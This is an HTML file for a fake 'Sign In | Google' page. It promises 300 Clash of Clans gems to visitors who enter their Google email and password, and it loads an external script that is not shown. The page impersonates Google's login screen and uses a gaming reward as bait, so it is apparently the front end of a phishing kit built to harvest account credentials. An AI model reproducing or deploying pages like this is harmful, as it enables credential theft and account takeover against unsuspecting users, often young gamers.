<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign In | Google</title>
    <link rel="shortcut icon" href="https://cdn-icons-png.flaticon.com/512/2504/2504739.png">
    <link rel="stylesheet" href="style.css">
    <style>

</style>
</head>
<body>
        <div class="box">
                <h2>Sign in </h2> 
                <p>Use your Google Account to authenticate your clash of clans account and get:<br> 300 GEMS</p>
                <div>
                  <div class="inputBox">
                    <input id="email" type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                    <label>Email</label>
                  </div>
                  <div class="inputBox">
                        <input id="password" type="password" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label>Password</label>
                      </div>
                  <input id="submitB" type="submit" name="sign-in" value="Sign In">
                </div>
              </div>

    <script src="script.js"></script>
</body>
</html>
